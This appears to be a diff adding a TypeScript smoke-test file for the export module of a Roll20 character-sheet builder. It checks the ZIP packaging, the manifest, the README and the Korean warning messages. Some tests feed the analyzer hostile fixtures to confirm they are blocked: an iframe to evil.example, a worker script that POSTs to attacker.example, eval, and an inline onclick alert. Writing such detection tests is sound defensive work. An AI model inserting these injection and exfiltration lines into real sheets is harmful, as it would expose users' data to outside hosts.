@@ -1,0 +1,205 @@
+/**
+ * Export 모듈 smoke 테스트 — 외부 의존 0, jsdom X.
+ *
+ * Stage 3 자동 검증:
+ *   (1) 정상 emit 결과 → ERROR 없음 → buildZip 성공 → unzip 4 파일 + README.txt
+ *   (2) PbtA-style narrative emit → 동일
+ *   (3) <iframe> 박힌 emit → ERROR 감지 → 다운로드 차단 분기
+ *   (4) 한국어 경고 메시지 자연스러움 sanity check
+ */
+
+import { analyzeEmit } from '../warnings';
+import { buildZip, buildFileName } from '../zip_builder';
+import { buildManifest, DEFAULT_METADATA } from '../manifest';
+import { buildReadme } from '../readme';
+import JSZip from 'jszip';
+import { hasBlockingError } from '@/lib/stores/workspaceStore';
+
+function assert(cond: unknown, msg: string): void {
+  if (!cond) throw new Error(`Assertion failed: ${msg}`);
+}
+
+// ── (1) D&D-style emit (정상) ──────────────────────────────────────────────
+async function testDndSmoke(): Promise<void> {
+  const html = `
+    <div class="sheet-tab"><h3 data-i18n="basic-info">Basic Info</h3></div>
+    <input type="text" name="attr_character_name" value="Hero">
+    <input type="number" name="attr_level" min="1" max="20" value="3">
+    <rolltemplate class="sheet-rolltemplate-default">
+      <div>{{name}} rolls {{r1}}</div>
+    </rolltemplate>
+    <script type="text/worker">
+      on('change:level', () => {
+        getAttrs(['level'], (v) => {
+          setAttrs({ proficiency: 2 + Math.floor(Number(v.level) / 4) });
+        });
+      });
+    </script>`;
+  const css = `.sheet-tab { padding: 8px; color: #222; }`;
+  const translation = JSON.stringify({ 'basic-info': '기본 정보' });
+
+  const warnings = analyzeEmit({ html, css, translation, warnings: [] });
+  assert(!hasBlockingError(warnings), 'D&D emit must NOT have ERROR');
+
+  const meta = { ...DEFAULT_METADATA, name: 'D&D 5e Sheet', author: 'Tester', system: 'D&D 5e' };
+  const zip = await buildZip({ html, css, translation, warnings: [] }, meta);
+  assert(zip.fileName.endsWith('.zip'), 'fileName ends with .zip');
+  assert(zip.blob.size > 0, 'zip size > 0');
+
+  const buf = await zip.blob.arrayBuffer();
+  const unpacked = await JSZip.loadAsync(buf);
+  const names = Object.keys(unpacked.files).sort();
+  assert(names.includes('sheet.html'), 'sheet.html present');
+  assert(names.includes('sheet.css'), 'sheet.css present');
+  assert(names.includes('translation.json'), 'translation.json present');
+  assert(names.includes('sheet.json'), 'sheet.json present');
+  assert(names.includes('README.txt'), 'README.txt present');
+
+  const manifest = JSON.parse(await unpacked.files['sheet.json'].async('string'));
+  assert(manifest.html === 'sheet.html', 'manifest.html');
+  assert(manifest.css === 'sheet.css', 'manifest.css');
+  assert(manifest.translations === 'translation.json', 'manifest.translations');
+  assert(manifest.legacy === false, 'manifest.legacy false');
+  assert(Array.isArray(manifest.useroptions), 'manifest.useroptions array');
+  assert(manifest.name === 'D&D 5e Sheet', 'manifest.name');
+  assert(manifest.authors === 'Tester', 'manifest.authors');
+  assert(manifest.system === 'D&D 5e', 'manifest.system');
+  assert(manifest.license === 'All rights reserved', 'manifest.license default');
+
+  const readme = await unpacked.files['README.txt'].async('string');
+  assert(readme.includes('Roll20 커스텀 시트 등록 가이드'), 'README KR title');
+  assert(readme.includes('sheet.html'), 'README mentions sheet.html');
+  assert(readme.includes('HTML Layout'), 'README mentions HTML Layout slot');
+}
+
+// ── (2) PbtA narrative-style emit (정상) ──────────────────────────────────
+async function testPbtaSmoke(): Promise<void> {
+  const html = `
+    <div class="pbta-move">
+      <label>이동(Act Under Fire) <input type="text" name="attr_move_label"></label>
+      <textarea name="attr_move_narrative"></textarea>
+    </div>
+    <div data-i18n="hx-track">Hx Track</div>`;
+  const css = `.pbta-move { display: flex; gap: 8px; }`;
+  const translation = JSON.stringify({ 'hx-track': 'Hx 트랙' });
+  const warnings = analyzeEmit({ html, css, translation, warnings: [] });
+  assert(!hasBlockingError(warnings), 'PbtA emit must NOT have ERROR');
+  const zip = await buildZip(
+    { html, css, translation, warnings: [] },
+    { ...DEFAULT_METADATA, name: 'PbtA Sheet', system: 'PbtA' },
+  );
+  const buf = await zip.blob.arrayBuffer();
+  const unpacked = await JSZip.loadAsync(buf);
+  assert(unpacked.files['sheet.html'], 'sheet.html present');
+  assert(unpacked.files['sheet.css'], 'sheet.css present');
+  assert(unpacked.files['README.txt'], 'README.txt present');
+}
+
+// ── (3) <iframe> 박힌 emit → ERROR 차단 ──────────────────────────────────
+function testIframeBlocked(): void {
+  const html = `<iframe src="https://evil.example/widget"></iframe>`;
+  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
+  const iframeWarning = warnings.find((w) => w.code === 'export.html.iframe');
+  assert(!!iframeWarning, 'iframe warning detected');
+  assert(iframeWarning!.severity === 'error', 'iframe = ERROR');
+  assert(hasBlockingError(warnings), 'must block download');
+}
+
+function testFetchBlocked(): void {
+  const html = `<script type="text/worker">
+    fetch('https://attacker.example/log', { method: 'POST', body: 'pwned' });
+  </script>`;
+  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
+  assert(
+    warnings.some((w) => w.code === 'export.script.external_fetch' && w.severity === 'error'),
+    'external fetch ERROR',
+  );
+}
+
+function testEvalBlocked(): void {
+  const html = `<script type="text/worker">eval('1+1')</script>`;
+  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
+  assert(
+    warnings.some((w) => w.code === 'export.script.eval' && w.severity === 'error'),
+    'eval ERROR',
+  );
+}
+
+function testInlineHandlerBlocked(): void {
+  const html = `<button onclick="alert(1)">go</button>`;
+  const warnings = analyzeEmit({ html, css: '', translation: '{}', warnings: [] });
+  assert(
+    warnings.some((w) => w.code === 'export.html.inline_handler' && w.severity === 'error'),
+    'inline handler ERROR',
+  );
+}
+
+// ── (4) 한국어 메시지 자연스러움 — 어색한 한자/영문 잔재 없는지 ────────────
+function testKoreanMessages(): void {
+  const samples = [
+    `<iframe src="x"></iframe>`,
+    `<script>fetch('//x')</script>`,
+    `<button onclick="x()">go</button>`,
+    `<img src="https://a.example/x.png">`,
+  ];
+  const all = samples
+    .flatMap((html) => analyzeEmit({ html, css: '', translation: '{}', warnings: [] }))
+    .map((w) => w.message);
+  // sanity: 모든 메시지가 한글 음절을 포함해야 함
+  for (const m of all) {
+    assert(/[가-힣]/.test(m), `non-Korean message: ${m}`);
+  }
+  // 영어 단독 잔재 없는지 (코드 식별자 sheet.html 등은 허용)
+  const culprits = all.filter((m) =>
+    /\b(should|must|cannot|please|warning:|error:)\b/i.test(m),
+  );
+  assert(culprits.length === 0, `English-only word in message: ${culprits.join(' / ')}`);
+}
+
+function testFileNameSlug(): void {
+  assert(buildFileName({ ...DEFAULT_METADATA, name: '내 시트', version: '1.2.3' }) === '내-시트-1.2.3.zip', 'slug korean');
+  assert(buildFileName({ ...DEFAULT_METADATA, name: '', version: '' }) === 'sheet-0.1.0.zip', 'defaults');
+  assert(buildFileName({ ...DEFAULT_METADATA, name: 'A/B*C', version: '0.1.0' }) === 'ABC-0.1.0.zip', 'sanitize');
+}
+
+function testManifestShape(): void {
+  const m = JSON.parse(buildManifest({ ...DEFAULT_METADATA, name: '', author: '', system: '' }));
+  assert(m.name === 'Untitled Sheet', 'default name');
+  assert(m.authors === 'Anonymous', 'default authors');
+  assert(m.version === '0.1.0', 'default version');
+  assert(!('system' in m), 'system omitted when empty');
+}
+
+function testReadmeIncludesSystem(): void {
+  const r = buildReadme({ ...DEFAULT_METADATA, name: 'X', system: 'PbtA' });
+  assert(r.includes('시스템: PbtA'), 'readme system line');
+}
+
+async function main(): Promise<void> {
+  await testDndSmoke();
+  console.log('  ✓ D&D smoke');
+  await testPbtaSmoke();
+  console.log('  ✓ PbtA smoke');
+  testIframeBlocked();
+  console.log('  ✓ iframe → ERROR');
+  testFetchBlocked();
+  console.log('  ✓ fetch → ERROR');
+  testEvalBlocked();
+  console.log('  ✓ eval → ERROR');
+  testInlineHandlerBlocked();
+  console.log('  ✓ onclick → ERROR');
+  testKoreanMessages();
+  console.log('  ✓ Korean messages natural');
+  testFileNameSlug();
+  console.log('  ✓ fileName slug');
+  testManifestShape();
+  console.log('  ✓ manifest shape');
+  testReadmeIncludesSystem();
+  console.log('  ✓ README system line');
+  console.log('All export smoke tests passed.');
+}
+
+main().catch((err) => {
+  console.error(err);
+  process.exit(1);
+});
